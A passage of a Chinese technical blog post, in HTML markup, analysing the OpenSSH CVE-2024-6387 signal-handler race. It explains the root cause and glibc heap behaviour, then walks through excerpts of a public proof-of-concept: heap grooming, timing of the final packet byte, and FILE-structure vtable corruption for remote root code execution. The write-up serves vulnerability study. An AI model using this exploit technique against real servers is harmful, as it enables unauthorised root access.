-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-07-02 10:52:01" itemprop="dateCreated datePublished" datetime="2024-07-02T10:52:01+08:00">2024-07-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-07-19 10:37:13" itemprop="dateModified" datetime="2024-07-19T10:37:13+08:00">2024-07-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>9.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release notes 查看。这个漏洞的影响是毁灭性的，它可以在基于 glibc 的 Linux 系统上远程利用，获得未经授权的Root级别代码执行。更令人担忧的是，sshd以完全特权运行，且未沙箱化，这使得攻击面更加严峻。目前，针对搭载 Glibc 的 32 位 Linux 发行版的漏洞 PoC 已经发布，根据漏洞发现者披露，该漏洞在 64 位 Linux 中很可能也可以进行利用，对于 MacOS 与 Windows 也有一定的潜在风险。</p>
-<p>下面对该漏洞进行简要分析。</p>
-<p>分析使用的OpenSSH版本：9.7p1</p>
-<p>参考资料：<a target="_blank" rel="noopener" href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">资料</a></p>
-<h1 id="a-漏洞成因"><a class="markdownIt-Anchor" href="#a-漏洞成因"></a> A. 漏洞成因</h1>
-<p>这个漏洞可以看做是 CVE-2006-5051 的重演，该漏洞在 8.5p1 版本被引入，产生的原因是在 commit 752250C 中错误地删除了 sigdie() 函数中的一条语句 <code>#ifdef DO_LOG_SAFE_IN_SIGHAND</code>，该函数在<code>SIGALRM</code>信号的 handler 函数中被直接调用。因此实际上该漏洞对于 &lt;4.4p1 版本的 OpenSSH 也有效。</p>
-<p>commit 信息：<a target="_blank" rel="noopener" href="https://github.com/openssh/openssh-portable/commit/752250caabda3dd24635503c4cd689b32a650794#diff-cac4c5e540bb96b16908efb139929424aa8065d1acaa0af3791e19aa775bbf42">链接</a></p>
-<p><img src="4.png" alt="" /></p>
-<p>在 SSHd 的 main 函数中，通过 <code>ssh_signal</code> 函数注册了对于 <code>SIGALRM</code> 信号的 handler 函数 <code>grace_alarm_handler</code>。在 SSHd 中，如果客户端在 <code>LoginGraceTime</code> （较新版本默认为120s）时间内没有完成认证，则会产生 <code>SIGALRM</code> 信号，并异步调用 <code>grace_alarm_handler</code>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sshd.c, line 2222</span></span><br><span class="line"></span><br><span class="line">ssh_signal(SIGALRM, grace_alarm_handler);</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// sshd.c, line 349</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal handler for the alarm after the login grace period has expired.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">grace_alarm_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to kill any processes that we have spawned, E.g. authorized</span></span><br><span class="line"><span class="comment">	 * keys command helpers or privsep children.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (getpgid(<span class="number">0</span>) == getpid()) &#123;</span><br><span class="line">		ssh_signal(SIGTERM, SIG_IGN);</span><br><span class="line">		kill(<span class="number">0</span>, SIGTERM);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Log error and exit. */</span></span><br><span class="line">	sigdie(<span class="string">&quot;Timeout before authentication for %s port %d&quot;</span>,</span><br><span class="line">	    ssh_remote_ipaddr(the_active_state),</span><br><span class="line">	    ssh_remote_port(the_active_state));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里重点关注 <code>sigdie</code>。下面是该函数的一条调用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sigdie                  // log.h, line 96</span><br><span class="line">  sshsigdie             // log.c, line 450</span><br><span class="line">    sshlogv             // log.c, line 463</span><br><span class="line">      do_log            // log.c, line 336</span><br><span class="line">        syslog</span><br></pre></td></tr></table></figure>
-<p><code>syslog</code> 是libc实现的库函数。如果在其中调用了异步执行不安全的函数（如 <code>malloc</code> ，因为 <code>malloc</code> 进行内存分配时不会加锁），那么就有可能出现内存不安全问题。</p>
-<p>事实是，它确实调用了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syslog                        /misc/bits/syslog.h, line 28</span><br><span class="line">  __syslog_chk                /misc/syslog.c, line 103</span><br><span class="line">    __vsyslog_internal        /misc/syslog.c, line 119</span><br><span class="line">      __localtime64_r         /time/localtime.c, line 27</span><br><span class="line">        __tz_convert          /time/tzset.c, line 566</span><br><span class="line">          tzset_internal      /time/tzset.c, line 366</span><br><span class="line">            __tzfile_read     /time/tzset.c, line 100</span><br><span class="line">              fopen</span><br><span class="line">              __fread_unlocked</span><br></pre></td></tr></table></figure>
-<p>当 <code>__localtime64_r</code> 第一次执行时，将按照上面的流程执行。可以看到，这里的 <code>fopen</code> 即为异步不安全函数调用，它的内部需要调用 <code>malloc</code> 分配一个 <code>FILE</code> 结构。在 <code>__fread_unlocked</code> 中也需要调用 <code>malloc</code> 分配一个 4KB 的读缓冲区。</p>
-<h1 id="b-漏洞利用前置知识"><a class="markdownIt-Anchor" href="#b-漏洞利用前置知识"></a> B. 漏洞利用前置知识</h1>
-<p>要深入理解该漏洞的整个利用逻辑，首先需要了解一些前置知识。</p>
-<h2 id="b1-相关-ssh-协议报文格式"><a class="markdownIt-Anchor" href="#b1-相关-ssh-协议报文格式"></a> B.1 相关 SSH 协议报文格式</h2>
-<p>OpenSSH 实现了对于 SSH 协议的所有解析逻辑，在本漏洞中，需要了解的是 SSH 协议的算法交换部分。</p>
-<p>在 SSH 建立连接之前，首先需要完成客户端与服务端的算法协商，这些算法包括密钥交换算法、报文加密算法等。因为客户端与服务端的 SSH 版本可能不同，支持的算法也可能不同，因此需要协商出客户端与服务端都实现的算法。对于算法的协商，SSH 协议通过4个报文完成：</p>
-<ol>
-<li>客户端将自身支持的算法发送至服务端。</li>
-<li>服务端将自身支持的算法发送至客户端。</li>
-<li>客户端向服务器发送自己选择的算法。</li>
-<li>服务端向客户端发送响应，表示收到客户端的算法选择。</li>
-</ol>
-<p>在前面两个报文中，对于支持算法的发送采用的是 ASCII 明文。具体的 SSH 报文格式如下：</p>
-<ul>
-<li>4 bytes – SSH 报文总长度（大端序）</li>
-<li>1 byte – padding length，即最后用于填充的字节数量</li>
-<li>1 byte – message code，即 SSH 报文消息码，算法选择的消息码为 20/0x14</li>
-<li>16 bytes – cookie</li>
-<li>变长部分 – 用于列举所有本端可用的算法。每一种算法发送的格式为：
-<ul>
-<li>4 bytes – algorithm length，即算法描述的长度</li>
-<li>变长部分 – 算法的具体内容，以 ASCII 码形式发送</li>
-</ul>
-</li>
-</ul>
-<p><img src="3.png" alt="" /></p>
-<p>可想而知，对于服务端与客户端而言，要想实现对这个报文的解析，必须使用一定的内存空间保存这些算法的相关描述。这一逻辑在 SSHd 中通过 <code>sshkey.c</code> 中的 <code>cert_parse</code>（line 1761）函数实现。在这个函数中循环调用 <code>malloc</code> 函数以保存报文内容。当发送的报文解析失败时，将会调用 <code>sshkey.c</code> 中的 <code>cert_free</code>（line 569）函数循环释放这些内存空间。</p>
-<h2 id="b2-glibc-内存分配相关规则"><a class="markdownIt-Anchor" href="#b2-glibc-内存分配相关规则"></a> B.2 Glibc 内存分配相关规则</h2>
-<p>该漏洞已经证实能够在基于 Glibc 的 Linux SSH 中完成利用。这与 Glibc 的内存分配策略高度相关。</p>
-<p>Glibc 将一块用户可用堆内存（称为 chunk）的大小保存在其前面（低地址）的位置，当用户程序需要释放 chunk 时，Glibc 将根据这块内存的大小将 chunk 链入不同的链表中（这些链表称为 bins）。根据功能不同，Glibc 将这些 bins 分为几类：tcache、fastbin、small bin、large bin、unsorted bin。</p>
-<p>Glibc 的内存分配主要通过 <code>_int_malloc</code> 函数实现，释放则主要通过 <code>_int_free</code> 实现。在<a href="elixir.bootlin.com">网址</a>中可以找到所有版本的 Glibc 源码，感兴趣的读者可自行查看。下面介绍与本漏洞相关的一些内存分配特性：</p>
-<p>在内存分配过程中，Glibc 首先会从 tcache、fastbin、small bin 中查找，如果没有找到合适的 chunk，则会遍历 unsorted bin 进行查找。unsorted bin 中可保存任意大小的较大的 chunk，遍历过程中，如果发现不等于分配需求的 chunk，会根据其大小将其转移到合适的 small bin/large bin 中。当 unsorted bin 遍历完毕后，如果还是没有找到合适的 chunk，则会尝试在 large bins 中寻找可用的大 chunk 并拆分之。这个拆分操作需要满足多个前提条件，这里不是重点。拆分完成后，剩余的 chunk 将会保存为 last remainder，该 chunk 将被放在 unsorted bin 的开头位置，它将在下一次遍历 unsorted bin 时优先被考虑分配。需要注意的是，<font color=red><strong>remainder chunk 是在其拆分完成后设置其 size 字段的。</strong></font>在 remainder chunk 被切分出来后，但没有设置 size 前，对 size 字段进行修改，即可实际上控制这个 chunk 的大小，可以让这个 chunk 与后面的 chunk 重叠。在 size 字段被正确修改前立即将该 chunk 分配出去，即可完成对堆内存的破坏。</p>
-<p><img src="CVE-2024-6387-%E5%88%86%E6%9E%90/2.png" alt="" /></p>
-<p>为了保证其他的内存分配操作不会破坏所需的堆内存布局，客户端可以通过多次发送公钥数据包填充 <code>tcache</code>，为了提升利用的成功率，在公钥文件不大于256KB的情况下，可以生成27个 large-small holes 结构。</p>
-<h1 id="c-poc"><a class="markdownIt-Anchor" href="#c-poc"></a> C. POC</h1>
-<p>POC 来源：<a target="_blank" rel="noopener" href="https://github.com/lflare/cve-2024-6387-poc">github</a></p>
-<p>下面分析POC中的关键代码逻辑。通过下面的分析可以帮助读者彻底了解该漏洞的利用方式、</p>
-<p>在POC中，首先需要进行与SSH服务器的连接与密钥交换。这部分代码不是重点，略过。</p>
-<h2 id="c1-堆内存布局"><a class="markdownIt-Anchor" href="#c1-堆内存布局"></a> C.1 堆内存布局</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_heap</span> <span class="params">(<span class="type">int</span> sock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Packet a: Allocate and free tcache chunks</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> tcache_chunk[<span class="number">64</span>];</span><br><span class="line">      <span class="built_in">memset</span> (tcache_chunk, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, tcache_chunk, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      <span class="comment">// These will be freed by the server, populating tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Allocate large chunk (~8KB)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> large_hole[<span class="number">8192</span>];</span><br><span class="line">      <span class="built_in">memset</span> (large_hole, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, large_hole, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate small chunk (320B)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> small_hole[<span class="number">320</span>];</span><br><span class="line">      <span class="built_in">memset</span> (small_hole, <span class="string">&#x27;C&#x27;</span>, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, small_hole, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> fake_data[<span class="number">4096</span>];</span><br><span class="line">      create_fake_file_structure (fake_data, <span class="keyword">sizeof</span> (fake_data),</span><br><span class="line">                                  GLIBC_BASES[<span class="number">0</span>]);</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, fake_data, <span class="keyword">sizeof</span> (fake_data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> large_string[MAX_PACKET_SIZE - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">memset</span> (large_string, <span class="string">&#x27;E&#x27;</span>, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">  send_packet (sock, <span class="number">5</span>, large_string, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在这里，<code>send_packet</code> 实现了一个简单的 SSH 协议数据包封装，用于发送 SSH 数据包。</p>
-<p>该函数中一共发送了4个数据包，这4个数据包的作用分别为：</p>
-<ol>
-<li>填充 tcache。</li>
-<li>创建 27 个大小 chunk 对，大 chunk 为 8KB，小 chunk 为 320B。</li>
-<li>写入伪造的 FILE 结构体数据。</li>
-<li>发送一个超大数据包，使得服务端对该 chunk 进行分配与释放，令 glibc 将 27 个大小 chunk 对中的 27 个大 chunk 和 27 个小 chunk 转移到 large bins 与 small bins 中。</li>
-</ol>
-<h2 id="c2-服务端解析数据时间测量"><a class="markdownIt-Anchor" href="#c2-服务端解析数据时间测量"></a> C.2 服务端解析数据时间测量</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">time_final_packet</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> *parsing_time)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> time_before = measure_response_time (sock, <span class="number">1</span>);</span><br><span class="line">  <span class="type">double</span> time_after = measure_response_time (sock, <span class="number">2</span>);</span><br><span class="line">  *parsing_time = time_after - time_before;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;Estimated parsing time: %.6f seconds\n&quot;</span>, *parsing_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span></span><br><span class="line"><span class="title function_">measure_response_time</span> <span class="params">(<span class="type">int</span> sock, <span class="type">int</span> error_type)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">end</span>;</span></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line">  send_packet (sock, <span class="number">50</span>, error_packet,</span><br><span class="line">               packet_size); <span class="comment">// SSH_MSG_USERAUTH_REQUEST</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> response[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">ssize_t</span> received;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      received = recv (sock, response, <span class="keyword">sizeof</span> (response), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (received &lt; <span class="number">0</span> &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN));</span><br><span class="line"></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;end);</span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> elapsed</span><br><span class="line">      = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">  <span class="keyword">return</span> elapsed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>堆内存布局完成后，POC 中通过 <code>time_final_packet</code> 来测量服务端解析客户端发送的数据的所需时间。这里测量了两次，分别代表不同错误的解析时间。两次测量对应的错误在 SSHd 中的时间差产生于是否调用了 <code>sshkey_from_blob</code>，因此将两个时间段相减即可得到函数 <code>sshkey_from_blob</code> 的执行时间。</p>
-<h2 id="c3-条件竞争"><a class="markdownIt-Anchor" href="#c3-条件竞争"></a> C.3 条件竞争</h2>
-<p>完成上述操作之后，客户端还需要发送最后一个超大的 SSH 报文。该报文是算法协商报文，长度为 SSH 协议允许的最大长度。由于 SSH 报文前面带有长度字段，因此一个 SSH 报文允许被包装在多个 TCP 报文中传输。在下面的代码中，POC 直接发送最后一个报文，但故意少发送 1 个字节，让服务端一直等待最后 1 个字节的到来：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">attempt_race_condition</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> parsing_time, <span class="type">uint64_t</span> glibc_base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> final_packet[MAX_PACKET_SIZE];</span><br><span class="line">  create_public_key_packet (final_packet, <span class="keyword">sizeof</span> (final_packet), glibc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send all but the last byte</span></span><br><span class="line">  <span class="keyword">if</span> (send (sock, final_packet, <span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;send final packet&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>随后，进行计时，准备好在即将超时的瞬间发送最后 1 个字节：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Precise timing for last byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">current</span>;</span></span><br><span class="line">clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    clock_gettime (CLOCK_MONOTONIC, &amp;current);</span><br><span class="line">    <span class="type">double</span> elapsed = (current.tv_sec - start.tv_sec)</span><br><span class="line">                     + (current.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">if</span> (elapsed &gt;= (LOGIN_GRACE_TIME - parsing_time - <span class="number">0.001</span>))</span><br><span class="line">      &#123; <span class="comment">// 1ms before SIGALRM</span></span><br><span class="line">        <span class="keyword">if</span> (send (sock, &amp;final_packet[<span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>], <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            perror (<span class="string">&quot;send last byte&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p>发送最后一个字节后，服务端发现这是一个算法协商报文，因此会多次调用 <code>cert_parse</code> 函数进行解析。POC 精心构造了这个超长报文，使得 <code>cert_parse</code> 将会循环 54 次解析过程，每次解析过程都会调用一次 <code>malloc</code> 函数。POC 能够让 SSHd 以 0x4096、0x304（<code>FILE</code> 结构体的大小）、0x4096、0x304、… 的顺序调用 <code>malloc</code> 函数分配内存，使得在后面的一段时间内，SSHd 会进行一系列的内存分配，同时由于超时，SSHd 将异步地执行另外的内存分配。在此之前，由于我们分配的 8KB、320 Bytes 内存中的任意内容均可控，因此完全可以提前在 320 byte 的 chunk 中写好伪造的 <code>FILE</code> 结构体与虚假的过大的 remainder size。这样一来，只要 <code>syslog</code> 抢在 remainder size 更新前将虚大的 remainder 分配出去，就能够使 remainder 部分覆盖 <code>syslog</code> 获取的 <code>FILE</code> 结构体。</p>
-<p>注意：由于 0x320 chunk 位于 tcache，因此 <code>syslog</code> 获取 <code>FILE</code> 结构体并不会切分 remainder，这个操作是由后面分配 4KB 的读缓冲区触发的。切分 remainder 后，还会剩下一个小 remainder，<code>_int_malloc</code> 一更新这个小 remainder 的相关字段，就完成了对 <code>syslog</code> 的 <code>FILE</code> 结构体的破坏。</p>
-<p><img src="2.png" alt="" /></p>
-<h2 id="c4-fsop"><a class="markdownIt-Anchor" href="#c4-fsop"></a> C.4 FSOP</h2>
-<p>该漏洞在32位下可以通过 FSOP 完成利用，这主要是考虑到 32 位系统的 ASLR 保护不完善，Glibc 只能映射到两个基地址：0xb7400000 或 0xb7200000。这正给了攻击者做文章的机会。</p>
-<p>在上一节，我们提到通过更新 remainder 的 相关字段，能够达到破坏 <code>FILE</code> 结构体的效果。具体而言，它实际上是修改了 <code>FILE</code> 结构体中的 <code>_vtable_offset</code> 字段：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>如果猜测 Glibc 的映射基地址为 0xb7400000，那么 last remainder 的 <code>fd</code> 指针与 <code>bk</code> 指针指向 unsorted bin 后，其值应该为 0xb761d7f8（随 Glibc 版本不同而不同，但高 2 字节基本都相同），反映到上面的 <code>FILE</code> 结构体中，则是将 <code>_vtable_offset</code> 修改为 <code>bk</code> 指针的第 3 个字节——0x61。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /malloc/malloc.c, line 4024</span></span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">  av-&gt;last_remainder = remainder;</span><br><span class="line">  remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
-<p>在 Glibc 中，对于文件读写等操作的相关函数是统一保存在一个个 vtable 中的，实际执行时需要首先访问 vtable，再获取其中的函数指针以调用执行。将 <code>_vtable_offset</code> 改为 0x61 后，<code>syslog</code> 的 <code>__fread_unlocked</code> 将会找到 <code>_IO_wfile_jumps</code> 这个 vtable，选择其中的 <code>_IO_wfile_underflow</code> 函数执行（正常情况下应该是执行 <code>_IO_file_jumps</code> 中的 <code>_IO_file_underflow</code>）。在 <code>_IO_wfile_underflow</code> 中，存在下面的调用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow     // Glibc 2.36, /libio/wfileops.c, line 110</span><br><span class="line">  __libio_codecvt_in    // Glibc 2.36, /libio/iofwide.c, line 161</span><br><span class="line">    DL_CALL_FCT         // Glibc 2.36, /iconv/skeleton.c, line 153</span><br></pre></td></tr></table></figure>
